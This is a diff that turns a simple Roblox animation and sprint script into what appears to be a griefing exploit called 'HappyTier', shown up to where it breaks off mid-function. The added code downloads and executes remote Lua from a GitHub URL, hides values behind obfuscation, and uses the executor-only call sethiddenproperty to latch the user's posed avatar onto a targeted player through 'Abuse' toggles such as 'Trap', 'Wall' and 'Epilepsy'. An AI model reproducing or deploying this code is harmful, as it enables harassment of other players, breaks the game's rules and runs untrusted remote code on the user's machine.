@@ -1,68 +1,3032 @@
------------------------------
--- CONFIG
------------------------------
-local ANIMATION_ID = 70883871260184          -- Your animation asset ID
-local FREEZE_AFTER_SECONDS = 1  -- Seconds before the animation freezes
 
--- MOVEMENT SPEEDS
-local BASE_WALK_SPEED = 16
-local SPRINT_SPEED = 30
+-- test2
 
------------------------------
--- SERVICES
------------------------------
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
+local NovaUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B4%F0%9D%96%A8%20%F0%9D%96%AB%F0%9D%97%82%F0%9D%96%BB%F0%9D%97%8B%F0%9D%96%BA%F0%9D%97%8B%F0%9D%97%92%20%F0%9D%96%B3%F0%9D%96%BE%F0%9D%97%8C%F0%9D%97%8D"))()
 
------------------------------
--- CHARACTER
------------------------------
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local animator = humanoid:WaitForChild("Animator")
+local floor   = math.floor
+local random  = math.random
+local tremove = table.remove
+local schar   = string.char
+local seed    = 0
+local stepA   = 2
+local encTable = {}
 
------------------------------
--- PLAY & FREEZE
------------------------------
-local function playAndFreeze()
-	if ANIMATION_ID == 0 then return end
-
-	local anim = Instance.new("Animation")
-	anim.AnimationId = "rbxassetid://" .. ANIMATION_ID
-
-	local track = animator:LoadAnimation(anim)
-	track.Looped = true
-	track.Priority = Enum.AnimationPriority.Action
-
-	track:Play()
-
-	task.delay(FREEZE_AFTER_SECONDS, function()
-		if track and track.IsPlaying then
-			track:AdjustSpeed(0) -- Freezes the animation in place permanently
-		end
-	end)
+do
+    local tempList = {}
+    for i = 1, 256 do tempList[i] = i end
+    repeat
+        local idx = random(1, #tempList)
+        local val = tremove(tempList, idx)
+        encTable[val] = schar(val - 1)
+    until #tempList == 0
 end
 
------------------------------
--- SPRINT INPUT
------------------------------
-humanoid.WalkSpeed = BASE_WALK_SPEED
+local ibuf = {}
 
-UserInputService.InputBegan:Connect(function(input, gp)
-	if gp then return end
-	if input.KeyCode == Enum.KeyCode.LeftShift then
-		humanoid.WalkSpeed = SPRINT_SPEED
-	end
-end)
+local function nextByte()
+    if #ibuf == 0 then
+        seed = (seed * 14911595048824) % 35184372088832
+        repeat stepA = (stepA * 188) % 257 until stepA ~= 1
+        local E = stepA % 32
+        local M = (floor(seed / 2^(13-(stepA-E)/32)) % 4294967296) / 2^E
+        local C = floor((M%1)*4294967296) + floor(M)
+        local J = C % 65536
+        local F = (C-J) / 65536
+        local U = J % 256
+        local v = (J-U) / 256
+        local e = F % 256
+        local R = (F-e) / 256
+        ibuf = {U, v, e, R}
+    end
+    return table.remove(ibuf)
+end
 
-UserInputService.InputEnded:Connect(function(input)
-	if input.KeyCode == Enum.KeyCode.LeftShift then
-		humanoid.WalkSpeed = BASE_WALK_SPEED
-	end
-end)
+local cache   = {}
+local encMeta = setmetatable({}, {__index=cache, __metatable=nil})
 
------------------------------
--- START
------------------------------
-playAndFreeze()
+local function encrypt(str, key)
+    if not cache[key] then
+        ibuf = {}
+        seed  = key % 35184372088832
+        stepA = key % 257
+        local len = string.len(str)
+        cache[key] = ""
+        local U = 128
+        for i = 1, len do
+            U = ((string.byte(str, i) + nextByte()) + U) % 256
+            cache[key] = cache[key] .. encTable[U+1]
+        end
+    end
+    return key
+end
+
+local RunService  = game:GetService("RunService")
+local weldPlayers = game:GetService("Players")
+local weldRun     = RunService
+local weldLocal   = weldPlayers.LocalPlayer
+
+do
+    local _c = weldLocal.Character or weldLocal.CharacterAdded:Wait()
+    _c:WaitForChild("HumanoidRootPart")
+    _c:WaitForChild("Humanoid")
+end
+
+local activeFlingCount = 0
+local selectedTarget   = nil
+local nanTarget        = ""
+
+local Window      = NovaUI:CreateWindow({Title = "HappyTier", Size = UDim2.new(0, 420, 0, 300)})
+local TabAbuse = Window:AddTab("Abuse")
+local TabTrolling = Window:AddTab("Trolling")
+
+local function cleanupToggle(conn, trk, noCollide)
+    if conn then conn:Disconnect() end
+    if trk  then trk:Stop(); trk:Destroy() end
+    local mc = weldLocal.Character
+    if mc then
+        for _, part in ipairs(mc:GetDescendants()) do
+            if part:IsA("BasePart") and noCollide then part.CanCollide = true end
+        end
+        local mr = mc:FindFirstChild("HumanoidRootPart")
+        if mr then
+            mr.AssemblyLinearVelocity  = Vector3.zero
+            mr.AssemblyAngularVelocity = Vector3.zero
+            pcall(sethiddenproperty, mr, "PhysicsRepRootPart", mr)
+        end
+    end
+end
+
+local function loadAnim(myChar, animId, freezeAt, freeze)
+    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
+    if not myHum then return nil end
+    local track
+    pcall(function()
+        local anim = Instance.new("Animation")
+        anim.AnimationId = "rbxassetid://" .. tostring(animId)
+        track = myHum:LoadAnimation(anim)
+        track.Priority = Enum.AnimationPriority.Action4
+        track:Play()
+        track.TimePosition = freezeAt or 0
+        if freeze then track:AdjustSpeed(0) end
+    end)
+    return track
+end
+
+local function makeWallToggle(tab, label, cfg)
+    local conn              = nil
+    local enabled           = false
+    local track             = nil
+    local lastChar          = nil
+    local up                = cfg.up       or 0
+    local forward           = cfg.forward  or 0
+    local side              = cfg.side     or 0
+    local tiltX             = cfg.tiltX    or 0
+    local tiltY             = cfg.tiltY    or 0
+    local tiltZ             = cfg.tiltZ    or 0
+    local faceBack          = cfg.faceBack or false
+    local noCollide         = (cfg.noCollide ~= false)
+    local spinSpeed         = cfg.spinSpeed
+    local fakeChar          = nil
+    local fakeAnimTracks    = {}
+    local renderConn        = nil
+    local transparencyConn  = nil
+    local camConn           = nil
+    local realChar          = nil
+    local savedCamSubject   = nil
+    local respawning        = false
+    local savedTracks       = {}
+    local targetDiedConn    = nil
+    local targetRemovedConn = nil
+    local targetRespawnConn = nil
+    local lastFakeCFrame    = nil
+    local deathHandled      = false
+    local controls          = nil
+
+    pcall(function()
+        local PM = require(weldLocal:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+        controls = PM:GetControls()
+    end)
+
+    local function loadEmote(char)
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return nil end
+        local hi = (4096^3*1024)+(999^2*516158)+(37^4*43)-(123^3*7)+(8888*9)-314159-66^4-47471589
+        savedTracks = {}
+        for _, t in pairs(hum:GetPlayingAnimationTracks()) do
+            table.insert(savedTracks, {track=t, speed=t.Speed, timePosition=t.TimePosition})
+            t:Stop()
+        end
+        local as = char:FindFirstChild("Animate")
+        if as then as.Disabled = true end
+        local anim = Instance.new("Animation")
+        anim.AnimationId = "rbxassetid://" .. hi
+        local t = hum:LoadAnimation(anim)
+        t:Play(); t:AdjustSpeed(0); t.TimePosition = 1678*0.00000323
+        return t
+    end
+
+    local function restoreTracks(char)
+        if not char then return end
+        local as = char:FindFirstChild("Animate")
+        if as then as.Disabled = false end
+        for _, saved in pairs(savedTracks) do
+            if saved.track and not saved.track.IsPlaying then
+                saved.track:Play()
+                saved.track:AdjustSpeed(saved.speed)
+                saved.track.TimePosition = saved.timePosition
+            end
+        end
+        savedTracks = {}
+    end
+
+    local function getCharAnims(char)
+        local animate = char:FindFirstChild("Animate")
+        if not animate then return {} end
+        local function ga(name)
+            local f = animate:FindFirstChild(name)
+            if f then
+                local a = f:FindFirstChildWhichIsA("Animation")
+                if a then return a.AnimationId end
+            end
+        end
+        return {Idle=ga("idle"), Walk=ga("walk"), Run=ga("run"), Jump=ga("jump"), Fall=ga("fall")}
+    end
+
+    local function stopFakeAnims()
+        for _, t in pairs(fakeAnimTracks) do
+            if t and t.IsPlaying then t:Stop(0.1) end
+        end
+    end
+
+    local function cleanupFakeChar()
+        if renderConn       then renderConn:Disconnect();       renderConn       = nil end
+        if transparencyConn then transparencyConn:Disconnect(); transparencyConn = nil end
+        if camConn          then camConn:Disconnect();          camConn          = nil end
+        fakeAnimTracks = {}
+        if fakeChar then fakeChar:Destroy(); fakeChar = nil end
+        realChar = nil
+    end
+
+    local function teleportToFake(onDone)
+        local cf = nil
+        if fakeChar then
+            local fr = fakeChar:FindFirstChild("HumanoidRootPart")
+            if fr then cf = fr.CFrame end
+        end
+        if not cf then cf = lastFakeCFrame end
+        if not cf then if onDone then onDone() end; return end
+        task.spawn(function()
+            for _ = 1, 5 do
+                local mc = weldLocal.Character
+                local mr = mc and mc:FindFirstChild("HumanoidRootPart")
+                if mr then
+                    mr.CFrame = cf
+                    mr.AssemblyLinearVelocity  = Vector3.zero
+                    mr.AssemblyAngularVelocity = Vector3.zero
+                    break
+                end
+                task.wait(0.05)
+            end
+            if onDone then onDone() end
+        end)
+    end
+
+    local function destroyFakeChar()
+        if camConn then camConn:Disconnect(); camConn = nil end
+        local camera = workspace.CurrentCamera
+        if savedCamSubject then
+            camera.CameraSubject = savedCamSubject; savedCamSubject = nil
+        else
+            local rc = weldLocal.Character
+            local rh = rc and rc:FindFirstChild("Humanoid")
+            if rh then camera.CameraSubject = rh end
+        end
+        if fakeChar and realChar then
+            local fr = fakeChar:FindFirstChild("HumanoidRootPart")
+            local rr = realChar:FindFirstChild("HumanoidRootPart")
+            if fr and rr then rr.CFrame = fr.CFrame end
+        end
+        restoreTracks(realChar)
+        cleanupFakeChar()
+    end
+
+    local connectTargetDied
+
+    local function spawnFakeChar()
+        local char = weldLocal.Character
+        if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+        realChar = char; char.Archivable = true
+        fakeChar = char:Clone()
+        fakeChar.Name = "WallClone"
+        fakeChar.Parent = workspace
+        local fakeHum  = fakeChar:FindFirstChild("Humanoid")
+        local fakeRoot = fakeChar:FindFirstChild("HumanoidRootPart")
+        if not fakeHum or not fakeRoot then return end
+        for _, v in pairs(fakeChar:GetDescendants()) do
+            if v:IsA("LocalScript") or v:IsA("Script") then
+                v:Destroy()
+            elseif v:IsA("BasePart") then
+                v.Anchored   = false
+                v.CanCollide = (v.Name == "HumanoidRootPart")
+                if v.Name == "HumanoidRootPart" then v.Transparency = 1 end
+            end
+        end
+        local ca = fakeChar:FindFirstChild("Animate")
+        if ca then ca.Disabled = true end
+        local rr = char:FindFirstChild("HumanoidRootPart")
+        if rr then fakeRoot.CFrame = rr.CFrame end
+        local charAnims = getCharAnims(char)
+        local function LA(id)
+            if not id then return nil end
+            local a = Instance.new("Animation"); a.AnimationId = id
+            return fakeHum:LoadAnimation(a)
+        end
+        fakeAnimTracks.Idle = LA(charAnims.Idle)
+        fakeAnimTracks.Walk = LA(charAnims.Walk)
+        fakeAnimTracks.Run  = LA(charAnims.Run)
+        fakeAnimTracks.Jump = LA(charAnims.Jump)
+        fakeAnimTracks.Fall = LA(charAnims.Fall)
+        if fakeAnimTracks.Idle then fakeAnimTracks.Idle:Play() end
+        local camera = workspace.CurrentCamera
+        savedCamSubject      = camera.CameraSubject
+        camera.CameraSubject = fakeHum
+        local camOverrideAllowed = true
+        camConn = camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
+            if not fakeChar or not camOverrideAllowed then return end
+            local fh = fakeChar:FindFirstChild("Humanoid")
+            if not fh then return end
+            -- Only re-assert if the new subject isn't from a BasePart/Humanoid we don't own
+            local newSubject = camera.CameraSubject
+            if newSubject == fh then return end
+            -- Brief cooldown so external scripts can coexist without loop-crashing
+            camOverrideAllowed = false
+            task.delay(0.1, function()
+                camOverrideAllowed = true
+                if not fakeChar then return end
+                local fh2 = fakeChar:FindFirstChild("Humanoid")
+                if fh2 then camera.CameraSubject = fh2 end
+            end)
+        end)
+        fakeHum.StateChanged:Connect(function(_, ns)
+            if ns == Enum.HumanoidStateType.Jumping then
+                stopFakeAnims(); if fakeAnimTracks.Jump then fakeAnimTracks.Jump:Play() end
+            elseif ns == Enum.HumanoidStateType.Freefall then
+                stopFakeAnims(); if fakeAnimTracks.Fall then fakeAnimTracks.Fall:Play() end
+            elseif ns == Enum.HumanoidStateType.Landed then
+                stopFakeAnims(); if fakeAnimTracks.Idle then fakeAnimTracks.Idle:Play() end
+            end
+        end)
+        transparencyConn = RunService.RenderStepped:Connect(function()
+            if not fakeChar then return end
+            local cam = workspace.CurrentCamera
+            local fh  = fakeChar:FindFirstChild("Head")
+            local inFP = fh and cam and (cam.CFrame.Position - fh.Position).Magnitude < 2.5
+            for _, part in pairs(fakeChar:GetDescendants()) do
+                if (part:IsA("BasePart") or part:IsA("MeshPart")) and part.Name ~= "HumanoidRootPart" then
+                    part.LocalTransparencyModifier = inFP and 1 or 0
+                end
+            end
+        end)
+        renderConn = RunService.RenderStepped:Connect(function()
+            if not fakeChar or not fakeHum or not fakeRoot then return end
+            local UIS = game:GetService("UserInputService")
+            local iv  = Vector3.zero
+            if controls then
+                iv = controls:GetMoveVector()
+            else
+                if UIS:IsKeyDown(Enum.KeyCode.W) then iv += Vector3.new(0,0,-1) end
+                if UIS:IsKeyDown(Enum.KeyCode.S) then iv += Vector3.new(0,0,1) end
+                if UIS:IsKeyDown(Enum.KeyCode.A) then iv += Vector3.new(-1,0,0) end
+                if UIS:IsKeyDown(Enum.KeyCode.D) then iv += Vector3.new(1,0,0) end
+            end
+            local cs = fakeHum:GetState()
+            if UIS:IsKeyDown(Enum.KeyCode.Space) and cs ~= Enum.HumanoidStateType.Jumping and cs ~= Enum.HumanoidStateType.Freefall then
+                fakeHum.Jump = true
+            end
+            local camCF = workspace.CurrentCamera.CFrame
+            local fd = (camCF.RightVector * iv.X) + (camCF.LookVector * -iv.Z)
+            fd = Vector3.new(fd.X, 0, fd.Z)
+            local grounded = cs == Enum.HumanoidStateType.Running or cs == Enum.HumanoidStateType.RunningNoPhysics
+            if fd.Magnitude > 0.01 then
+                fakeHum:Move(fd.Unit, false)
+                if grounded and fakeAnimTracks.Run and not fakeAnimTracks.Run.IsPlaying then
+                    stopFakeAnims(); fakeAnimTracks.Run:Play(0.1)
+                end
+            else
+                fakeHum:Move(Vector3.zero, false)
+                if grounded and fakeAnimTracks.Idle and not fakeAnimTracks.Idle.IsPlaying then
+                    stopFakeAnims(); fakeAnimTracks.Idle:Play(0.1)
+                end
+            end
+            if fakeRoot then lastFakeCFrame = fakeRoot.CFrame end
+        end)
+    end
+
+    connectTargetDied = function(tgtChar)
+        if targetDiedConn    then targetDiedConn:Disconnect();    targetDiedConn    = nil end
+        if targetRemovedConn then targetRemovedConn:Disconnect(); targetRemovedConn = nil end
+        if not tgtChar then return end
+        local tgtHum = tgtChar:FindFirstChildOfClass("Humanoid")
+        if not tgtHum then return end
+        deathHandled = false
+        local function handleDeath()
+            if not enabled or deathHandled then return end
+            deathHandled = true
+            if targetDiedConn    then targetDiedConn:Disconnect();    targetDiedConn    = nil end
+            if targetRemovedConn then targetRemovedConn:Disconnect(); targetRemovedConn = nil end
+            respawning = true
+            if fakeChar then
+                local fr = fakeChar:FindFirstChild("HumanoidRootPart")
+                if fr then lastFakeCFrame = fr.CFrame end
+            end
+            teleportToFake(function()
+                destroyFakeChar()
+                if track then track:Stop(); track:Destroy(); track = nil end
+                savedTracks = {}
+                if not selectedTarget then
+                    enabled = false
+                    activeFlingCount = math.max(0, activeFlingCount - 1)
+                    cleanupToggle(conn, track, noCollide)
+                    conn = nil; lastChar = nil; respawning = false; lastFakeCFrame = nil
+                    return
+                end
+                if targetRespawnConn then targetRespawnConn:Disconnect(); targetRespawnConn = nil end
+                targetRespawnConn = selectedTarget.CharacterAdded:Connect(function(newChar)
+                    if targetRespawnConn then targetRespawnConn:Disconnect(); targetRespawnConn = nil end
+                    if not enabled then respawning = false; return end
+                    task.wait(0.8)
+                    if not enabled then respawning = false; return end
+                    local mc = weldLocal.Character
+                    if mc then lastChar = mc; track = loadEmote(mc); spawnFakeChar() end
+                    connectTargetDied(newChar)
+                    respawning = false
+                end)
+            end)
+        end
+        targetDiedConn = tgtHum.Died:Connect(handleDeath)
+        targetRemovedConn = tgtChar.AncestryChanged:Connect(function(_, np)
+            if np == nil then handleDeath() end
+        end)
+    end
+
+    tab:AddToggle({
+        Label   = label,
+        Default = false,
+        Callback = function(state)
+            enabled = state
+            if not enabled then
+                activeFlingCount = math.max(0, activeFlingCount - 1)
+                cleanupToggle(conn, track, noCollide)
+                conn = nil; track = nil; lastChar = nil
+                respawning = false; lastFakeCFrame = nil; deathHandled = false
+                if targetDiedConn    then targetDiedConn:Disconnect();    targetDiedConn    = nil end
+                if targetRemovedConn then targetRemovedConn:Disconnect(); targetRemovedConn = nil end
+                if targetRespawnConn then targetRespawnConn:Disconnect(); targetRespawnConn = nil end
+                destroyFakeChar()
+                return
+            end
+            if not selectedTarget then return end
+            activeFlingCount = activeFlingCount + 1
+            local initChar = weldLocal.Character
+            if initChar then lastChar = initChar; track = loadEmote(initChar); spawnFakeChar() end
+            connectTargetDied(selectedTarget.Character)
+            conn = weldRun.Heartbeat:Connect(function()
+                if not enabled or respawning then return end
+                if not selectedTarget or not weldPlayers:FindFirstChild(selectedTarget.Name) then
+                    teleportToFake(function()
+                        enabled = false
+                        activeFlingCount = math.max(0, activeFlingCount - 1)
+                        cleanupToggle(conn, track, noCollide)
+                        conn = nil; track = nil; lastChar = nil
+                        respawning = false; lastFakeCFrame = nil; deathHandled = false
+                        if targetDiedConn    then targetDiedConn:Disconnect();    targetDiedConn    = nil end
+                        if targetRemovedConn then targetRemovedConn:Disconnect(); targetRemovedConn = nil end
+                        if targetRespawnConn then targetRespawnConn:Disconnect(); targetRespawnConn = nil end
+                        destroyFakeChar()
+                    end)
+                    return
+                end
+                local myChar = weldLocal.Character
+                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                if not myChar or not myRoot then return end
+                local tgtChar = selectedTarget.Character
+                local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                if not tgtChar or not tgtRoot then return end
+                if myChar ~= lastChar then
+                    lastChar = myChar; respawning = true
+                    cleanupFakeChar()
+                    local nh = myChar:FindFirstChild("Humanoid")
+                    if nh then workspace.CurrentCamera.CameraSubject = nh; savedCamSubject = nh end
+                    if track then track:Stop(); track:Destroy(); track = nil end
+                    savedTracks = {}
+                    connectTargetDied(tgtChar)
+                    task.spawn(function()
+                        task.wait(0.5)
+                        if not enabled then return end
+                        track = loadEmote(myChar); spawnFakeChar(); respawning = false
+                    end)
+                    return
+                end
+                pcall(function()
+                    for _, part in ipairs(myChar:GetDescendants()) do
+                        if part:IsA("BasePart") and noCollide then part.CanCollide = false end
+                    end
+                    local hum = myChar:FindFirstChildOfClass("Humanoid")
+                    local animator = hum and hum:FindFirstChildOfClass("Animator")
+                    if animator then
+                        for _, t in ipairs(animator:GetPlayingAnimationTracks()) do
+                            if t ~= track then t:Stop(0) end
+                        end
+                    end
+                    local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                    local yaw = faceBack and (tgtYaw + math.pi) or tgtYaw
+                    local cf = CFrame.new(tgtRoot.Position) * CFrame.Angles(0, yaw, 0) * CFrame.new(side, up, -forward)
+                    if spinSpeed then cf = cf * CFrame.Angles(0, os.clock() * spinSpeed, 0) end
+                    cf = cf * CFrame.Angles(math.rad(tiltX), math.rad(tiltY), math.rad(tiltZ))
+                    myRoot.CFrame = cf
+                    myRoot.AssemblyLinearVelocity  = Vector3.zero
+                    myRoot.AssemblyAngularVelocity = Vector3.zero
+                    sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
+                end)
+            end)
+        end,
+    })
+end
+
+local function makeSimpleToggle(tab, label, cfg)
+    local conn      = nil
+    local enabled   = false
+    local track     = nil
+    local lastChar  = nil
+    local up        = cfg.up       or 0
+    local forward   = cfg.forward  or 0
+    local side      = cfg.side     or 0
+    local tiltX     = cfg.tiltX    or 0
+    local tiltY     = cfg.tiltY    or 0
+    local tiltZ     = cfg.tiltZ    or 0
+    local faceBack  = cfg.faceBack or false
+    local noCollide = (cfg.noCollide == true)
+    local freezeAt  = cfg.freezeAt or 0
+    local animId    = cfg.animId   or 0
+    local useHead   = cfg.useHead  or false
+
+    tab:AddToggle({
+        Label   = label,
+        Default = false,
+        Callback = function(state)
+            enabled = state
+            if not enabled then
+                cleanupToggle(conn, track, noCollide)
+                conn = nil; track = nil; lastChar = nil
+                return
+            end
+            if not selectedTarget then return end
+            conn = weldRun.Heartbeat:Connect(function()
+                if not enabled then return end
+                if not selectedTarget or not weldPlayers:FindFirstChild(selectedTarget.Name) then
+                    enabled = false
+                    cleanupToggle(conn, track, noCollide)
+                    conn = nil; track = nil; lastChar = nil
+                    return
+                end
+                local partName = useHead and "Head" or "HumanoidRootPart"
+                local myChar = weldLocal.Character
+                local myRoot = myChar and myChar:FindFirstChild(partName)
+                if not myChar or not myRoot then return end
+                local tgtChar = selectedTarget.Character
+                local tgtRoot = tgtChar and tgtChar:FindFirstChild(partName)
+                if not tgtChar or not tgtRoot then return end
+                if myChar ~= lastChar then
+                    lastChar = myChar
+                    if track then track:Stop(); track:Destroy() end
+                    track = loadAnim(myChar, animId, freezeAt, true)
+                end
+                pcall(function()
+                    for _, part in ipairs(myChar:GetDescendants()) do
+                        if part:IsA("BasePart") and noCollide then part.CanCollide = false end
+                    end
+                    local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                    local yaw = faceBack and (tgtYaw + math.pi) or tgtYaw
+                    myRoot.CFrame = CFrame.new(tgtRoot.Position) * CFrame.Angles(0, yaw, 0)
+                        * CFrame.new(side, up, -forward)
+                        * CFrame.Angles(math.rad(tiltX), math.rad(tiltY), math.rad(tiltZ))
+                    myRoot.AssemblyLinearVelocity  = Vector3.zero
+                    myRoot.AssemblyAngularVelocity = Vector3.zero
+                    sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
+                end)
+            end)
+        end,
+    })
+end
+
+local function makeOscillatingToggle(tab, label, cfg)
+    local conn       = nil
+    local enabled    = false
+    local track      = nil
+    local lastChar   = nil
+    local up         = cfg.up        or 0
+    local forward    = cfg.forward   or 0
+    local side       = cfg.side      or 0
+    local tiltX      = cfg.tiltX     or 0
+    local tiltY      = cfg.tiltY     or 0
+    local tiltZ      = cfg.tiltZ     or 0
+    local faceBack   = cfg.faceBack  or false
+    local noCollide  = (cfg.noCollide == true)
+    local freezeAt   = cfg.freezeAt  or 0
+    local animId     = cfg.animId    or 0
+    local swingAmp   = cfg.swingAmp  or 3
+    local swingSpeed = cfg.swingSpeed or 1
+    local swingClock = 0
+
+    tab:AddToggle({
+        Label   = label,
+        Default = false,
+        Callback = function(state)
+            enabled = state
+            swingClock = 0
+            if not enabled then
+                cleanupToggle(conn, track, noCollide)
+                conn = nil; track = nil; lastChar = nil
+                return
+            end
+            if not selectedTarget then return end
+            conn = weldRun.Heartbeat:Connect(function(dt)
+                if not enabled then return end
+                if not selectedTarget or not weldPlayers:FindFirstChild(selectedTarget.Name) then
+                    enabled = false
+                    cleanupToggle(conn, track, noCollide)
+                    conn = nil; track = nil; lastChar = nil
+                    return
+                end
+                local myChar = weldLocal.Character
+                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                if not myChar or not myRoot then return end
+                local tgtChar = selectedTarget.Character
+                local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                if not tgtChar or not tgtRoot then return end
+                if myChar ~= lastChar then
+                    lastChar = myChar
+                    if track then track:Stop(); track:Destroy() end
+                    track = loadAnim(myChar, animId, freezeAt, true)
+                end
+                swingClock = swingClock + dt
+                local swingOffset = forward + math.sin(swingClock * swingSpeed * math.pi * 2) * swingAmp
+                pcall(function()
+                    for _, part in ipairs(myChar:GetDescendants()) do
+                        if part:IsA("BasePart") and noCollide then part.CanCollide = false end
+                    end
+                    local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                    local yaw = faceBack and (tgtYaw + math.pi) or tgtYaw
+                    myRoot.CFrame = CFrame.new(tgtRoot.Position) * CFrame.Angles(0, yaw, 0)
+                        * CFrame.new(side, up, -swingOffset)
+                        * CFrame.Angles(math.rad(tiltX), math.rad(tiltY), math.rad(tiltZ))
+                    myRoot.AssemblyLinearVelocity  = Vector3.zero
+                    myRoot.AssemblyAngularVelocity = Vector3.zero
+                    sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
+                end)
+            end)
+        end,
+    })
+end
+
+local function makeSmartPositionToggle(tab, label, cfg)
+    local conn         = nil
+    local enabled      = false
+    local track        = nil
+    local lastChar     = nil
+    local lastState    = "front"
+    local backCounter  = 0
+    local frontCounter = 0
+    local animId       = cfg.animId   or 0
+    local freezeAt     = cfg.freezeAt or 0
+    local frontOff     = cfg.frontOff
+    local backOff      = cfg.backOff
+
+    tab:AddToggle({
+        Label   = label,
+        Default = false,
+        Callback = function(state)
+            enabled = state
+            if not enabled then
+                cleanupToggle(conn, track, false)
+                conn = nil; track = nil; lastChar = nil
+                lastState = "front"; backCounter = 0; frontCounter = 0
+                return
+            end
+            if not selectedTarget then return end
+            conn = weldRun.Heartbeat:Connect(function()
+                if not enabled then return end
+                if not selectedTarget or not weldPlayers:FindFirstChild(selectedTarget.Name) then
+                    enabled = false
+                    cleanupToggle(conn, track, false)
+                    conn = nil; track = nil; lastChar = nil
+                    lastState = "front"; backCounter = 0; frontCounter = 0
+                    return
+                end
+                local myChar = weldLocal.Character
+                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+                if not myChar or not myRoot then return end
+                local tgtChar = selectedTarget.Character
+                local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
+                if not tgtChar or not tgtRoot then return end
+                if myChar ~= lastChar then
+                    lastChar = myChar
+                    if track then track:Stop(); track:Destroy() end
+                    track = loadAnim(myChar, animId, freezeAt, true)
+                    if track then track:Play(); track.TimePosition = freezeAt; track:AdjustSpeed(0) end
+                end
+                pcall(function()
+                    local vel      = tgtRoot.AssemblyLinearVelocity
+                    local tgtHuman = tgtChar:FindFirstChildOfClass("Humanoid")
+                    local moveDir  = tgtHuman and tgtHuman.MoveDirection or Vector3.zero
+                    local isMoving = moveDir.Magnitude > 0.1
+                    local tgtFwd   = Vector3.new(tgtRoot.CFrame.LookVector.X, 0, tgtRoot.CFrame.LookVector.Z).Unit
+                    local dot      = moveDir:Dot(tgtFwd)
+                    local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
+                    local baseCF   = CFrame.new(tgtRoot.Position) * CFrame.Angles(0, tgtYaw, 0)
+                    local isAirborne = math.abs(vel.Y) > 15
+                    if not isAirborne then
+                        if isMoving and dot < 0 then
+                            backCounter = backCounter + 1; frontCounter = 0
+                        elseif isMoving and dot >= 0 then
+                            frontCounter = frontCounter + 1; backCounter = 0
+                        else
+                            backCounter = 0; frontCounter = 0
+                        end
+                        if backCounter >= 5 then
+                            lastState = "back"; frontCounter = 0
+                        elseif frontCounter >= 5 then
+                            lastState = "front"; backCounter = 0
+                        end
+                    end
+                    local off = (lastState == "back") and backOff or frontOff
+                    myRoot.CFrame = baseCF * CFrame.new(off[1], off[2], off[3])
+                    myRoot.AssemblyLinearVelocity  = Vector3.zero
+                    myRoot.AssemblyAngularVelocity = Vector3.zero
+                    sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
+                end)
+            end)
+        end,
+    })
+end
+
+TabAbuse:AddTextInput({
+    Label       = "Player Name",
+    Placeholder = "Enter player/-",
+    Callback = function(input)
+        input = (tostring(input or "")):lower()
+        selectedTarget = nil
+        if input == "" then return end
+        for _, plr in ipairs(weldPlayers:GetPlayers()) do
+            if plr == weldLocal then continue end
+            local name    = plr.Name:lower()
+            local display = (plr.DisplayName or plr.Name):lower()
+            if name == input or display == input
+            or name:sub(1, #input) == input or display:sub(1, #input) == input then
+                selectedTarget = plr
+                break
+            end
+        end
+    end,
+})
+
+makeWallToggle(TabAbuse, "Wall (Layered Clothing)", {
+    up=-300, forward=0.5, side=0, tiltX=225, tiltY=0, tiltZ=0, faceBack=false, noCollide=true
+})
+makeWallToggle(TabAbuse, "Floor (Layered Clothing)", {
+    up=-3, forward=-1000, side=0, tiltX=135, tiltY=0, tiltZ=0, faceBack=false, noCollide=true
+})
+makeWallToggle(TabAbuse, "Epilepsy (Layered Clothing)", {
+    up=-300, forward=0.5, side=0, tiltX=225, tiltY=0, tiltZ=0, faceBack=false, noCollide=true, spinSpeed=40
+})
+
+makeSimpleToggle(TabAbuse, "Trap 3", {
+    up=0.1, forward=0.8, side=0, tiltX=0, tiltY=180, tiltZ=0, faceBack=false, noCollide=true, freezeAt=1, animId=112970170362272
+})
+makeSimpleToggle(TabAbuse, "Trap 2", {
+    up=-0.1, forward=0.8, side=0, tiltX=0, tiltY=180, tiltZ=0, faceBack=false, noCollide=true, freezeAt=9.99, animId=131141529556604
+})
+makeSimpleToggle(TabAbuse, "Trap", {
+    up=-0.1, forward=0.8, side=0, tiltX=0, tiltY=180, tiltZ=0, faceBack=false, noCollide=true, freezeAt=9.99, animId=104003529319122
+})
+
+do
+    local caConn     = nil
+    local caEnabled  = false
+    local HOVER_UP   = -80
+    local CLOSE_DIST = 25
+    local BELOW_OFF  = -1
+    local NEARBY_DUR = 0.5
+    local latchRoot  = nil
+    local latchTime  = 0
+
+    local function stopAura()
+        activeFlingCount = math.max(0, activeFlingCount - 1)
+        if caConn then caConn:Disconnect(); caConn = nil end
+    end
+
+    local function findNearby(tgtRoot)
+        local closest, closestDist = nil, CLOSE_DIST
+        for _, plr in ipairs(weldPlayers:GetPlayers()) do
+            if plr == weldLocal or plr == selectedTarget then continue end
+            local char = plr.Character
+            local root = char and char:FindFirstChild("HumanoidRootPart")
+            if not root then continue end
+            local dist = (root.Position - tgtRoot.Position).Magnitude
+            if dist < closestDist then closestDist = dist; closest = root end
+        end
+        return closest
+    end
+
+    local function startAura()
